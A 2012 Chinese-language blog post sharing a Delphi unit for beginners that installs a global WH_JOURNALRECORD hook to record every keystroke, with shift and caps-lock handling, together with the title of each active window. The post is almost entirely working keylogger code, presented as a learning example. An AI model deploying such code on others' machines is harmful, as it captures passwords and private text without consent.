---
author: bccsafe
comments: true
date: 2012-11-20 14:55:34+00:00
layout: post
slug: delphi-%e7%ae%80%e5%8d%95%e9%94%ae%e7%9b%98%e9%92%a9%e5%ad%90
title: 键盘钩子 Hook WH_JOURNALRECORD
wordpress_id: 83
categories:
- wp_Code[Delphi]
tags:
- 键盘钩子
---

那些年，刚开始学delphi时，看到长长几页的代码就觉得很高深

后来想想也没什么...比如下面的代码

给刚入门的看看  delphi  Hook  WH_JOURNALRECORD钩子 

N年前的代码 哪本书上的忘记了 反正自己做了个简单的封装 然后就烂在硬盘里了

WinXP + D7   测试通过

``` delphi 
unit UnitKeyHook;

interface

uses
  Windows, Messages,SysUtils, Classes;

  function PrintHook():string;
  procedure BeginHook();
  procedure EndHook();

var
  LogHook:HHook=0;
  LastFocusWnd:Hwnd=0;
  PrvChar:Char;
  HookKey:String;

KeyHook:Tstringlist;

const
  KeyMask=$80000000;

implementation

function LogProc(iCode:integer;wparam,lparam:longint):lresult;stdcall;
var
    ch:Char;           //记录一个个按下的按键字符
    vKey:integer;      //表示按下了哪个键
    FocusWnd:HWND;     //当前活动窗口句柄
    Title:array[0..255] of char;    //窗口句柄的标题
    str:array[0..12] of char;       // 当8<=vkey<=46时，表示按下的键名，例如[退格]
    //LogFile:TextFile;           //记录保存到文件
    PEvt:^EventMsg;         //EventMsg的指针
    iCapsLock,iNumLock,iShift:integer; //状态按键
    bCapsLock,bNumLock,bShift:boolean; //是否按下状态按键
begin
    if (iCode <0 ) then
    begin
        Result := CallNextHookEx(LogHook,iCode,wparam,lparam);    //调用钩子链表的下一个子程
        exit;
    end;
    if (iCode = HC_ACTION) then                   //设备动作
    begin
        PEvt := pointer(Dword(lparam));           //将lparam的指针传递给PEvt事件消息指针
        FocusWnd:= GetActiveWindow;               //获取活动窗体句柄
        if (LastFocusWnd <> FocusWnd) then
        begin
            if (HookKey <> '') then
            begin
                  KeyHook.Add('键盘击打：'+HookKey);
                  HookKey:= '';
            end;
            GetWindowText(FocusWnd,Title,256);
            LastFocusWnd:= FocusWnd;
            KeyHook.add(Format('激活窗口：%s',[Title]));
        end;
    if (PEvt.message = WM_KEYDOWN) then       //if 事件消息为键下压操作
    begin
        vkey := LoByte(PEvt.paramL );         //取得16进制数最低位那个字节的内容
        iShift:= GetKeyState(VK_SHIFT);       //获取这三个键的状态
        iCapsLock:= GetKeyState(VK_CAPITAL);
        iNumLock:= GEtKeyState(VK_NUMLOCK);
        bShift:= ((iShift and KeyMask) = KeyMask); //判断它们的状态
        bCapsLock:=(iCapsLock = 1);
        bNumLock:= (iNumLock = 1);
    end;
    if ((vKey >= 48) and (vKey <=57)) then       //      0<=char(vkey)<=9
    begin
        if (not bShift) then                     //如果没有按下Shift键
            ch:= char (vkey)                     //数字字符
        else
        begin
            case vkey of                         //否则为以下字符之一
                48:ch:= ')';
                49:ch:= '!';
                50:ch:= '@';
                51:ch:= '#';
                52:ch:= '$';
                53:ch:= '%';
                54:ch:= '^';
                55:ch:= '&';
                56:ch:= '*';
                57:ch:= '(';
            end; //end case
        end;    //end else
        HookKey:= HookKey + ch;
    end;        //end if ((vKey >= 48) and (vKey <=57))
    if ((vKey >=65) and (vKey <= 90)) then   // 'A'<=char(vkey)<='Z'
    begin
         if (not bCapsLock) then            //如果没有按下CapsLock键
         begin
            if (bShift) then                //按下了Shift键
              ch:= char(vkey)               //大写
            else
              ch:= char(vkey + 32);         //小写
         end
         else                              //按下了CapsLock键
         begin
             if (bShift) then              //按下了Shift键
               ch:= char(vkey + 32)        //小写
             else
               ch:= char(vkey);            //大写
         end;
         HookKey:= HookKey + ch;           //将按键添加到按键字符串
    end;
    if ((vkey >= 96) and (vkey <= 105)) then      //小键盘的0-9
        if bNumLock then
          HookKey:= HookKey + char(vkey - 96 + 48);
    ch:= 'n';
    if ((vkey >= 105) and (vkey <=111)) then     //+-*/
    begin
        case vkey of
            106:ch:= '*';
            107:ch:= '+';
            109:ch:= '-';
            111:ch:= '/';
        else
            ch:= 'n';
        end;
    end;
    if ((vkey >=186) and (vkey <= 222)) then        //特殊符号
    begin
        if (not bShift) then            //没有按下Shift键
        begin
            case vkey of
                186:ch:= ';';
                187:ch:= '=';
                189:ch:= ',';
                190:ch:= '.';
                191:ch:= '/';
                192:ch:= '''' ;
                219:ch:= '[';
                220:ch:= '\';
                221:ch:= ']';
                222:ch:=char(27);
            else
                ch:= 'n';
            end; //end case
        end
        else
        begin
             case vkey of
                186:ch:= ':';
                187:ch:= '+';
                189:ch:= '<';
                190:ch:= '>';
                191:ch:= '?';
                192:ch:= '~';
                219:ch:= '{';
                220:ch:= '|';
                221:ch:= '}';
                222:ch:= '"';
             else
                ch:= 'n';
             end;   //end case
        end;     //end if else
    end;        //end if ((vkey >=186) and (vkey <= 222))
    if ch <> 'n' then              //剔除未规定字符
        HookKey := HookKey + ch;
    if ((vkey >= 8) and (vkey <=46)) then
    begin
        ch:= ' ';
        case vkey of
            8:str:= '[BACK]';
            9:str:= '[TAB]';
            13:str:= '[ENTER]';
            32:str:= '[SPACE]';
            35:str:= '[END]';
            36:str:= '[HOME]';
            37:str:= '[LF]';
            38:str:= '[UF]';
            39:str:= '[RF]';
            40:str:= '[DF]';
            45:str:= '[INSERT]';
            46:str:= '[DELETE]';
        else
            ch:= 'n';
        end;
        if (ch <> 'n') then
        begin
            HookKey := HookKey + str;
        end;
    end;
    end; //end iCode= HC_ACTION
    result := CallNextHookEx(LogHook,iCode,wparam,lparam);
end;

procedure BeginHook();
begin
  if (LogHook = 0) then
  begin
    LogHook := SetWindowsHookEx(WH_JOURNALRECORD,LogProc,HInstance,0);    //调用API HOOK
    KeyHook:=Tstringlist.Create;
  end;
end;

procedure EndHook();
begin
  if (LogHook <> 0 ) then
  begin
    UnHookWindowsHookEx(LogHook);    //卸载HOOK
    LogHook:=0;
    KeyHook.Free;
  end;
end;

function PrintHook():string;
begin
  if KeyHook <> nil then
  begin
    result:=keyhook.Text;
    keyhook.Clear;
  end;
end;

end.
```


